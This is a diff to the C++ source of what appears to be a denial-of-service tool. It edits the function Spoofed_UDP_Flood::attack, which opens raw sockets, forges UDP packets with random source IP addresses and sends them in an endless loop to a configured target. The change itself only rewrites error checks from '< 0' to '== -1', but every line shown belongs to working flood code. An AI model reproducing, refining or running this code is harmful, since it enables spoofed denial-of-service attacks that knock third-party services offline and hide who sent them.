@@ -21,25 +21,25 @@ void Spoofed_UDP_Flood::attack(const int *id) {
     while (true){
         for(x = 0; x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
-            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0){
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1){
                 logger->Log("socket() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
-                if((ip->daddr = inet_addr(conf->website.c_str())) < 0){
+                if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
                     logger->Log("Can't resolve the host", Logger::Error);
                     exit(EXIT_FAILURE);
                 }
             }else{
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->saddr = inet_addr(Randomizer::randomIP())) < 0){
+            if((ip->saddr = inet_addr(Randomizer::randomIP())) == -1){
                 logger->Log("Unable to set random src ip", Logger::Error);
                 exit(EXIT_FAILURE);
             }
@@ -80,12 +80,12 @@ void Spoofed_UDP_Flood::attack(const int *id) {
 
             udp->check = csum( (unsigned short*) pseudogram , psize);
 
-            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if(sendto(s, buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
+            if(sendto(s, buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) == -1){
                 logger->Log("sendto() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
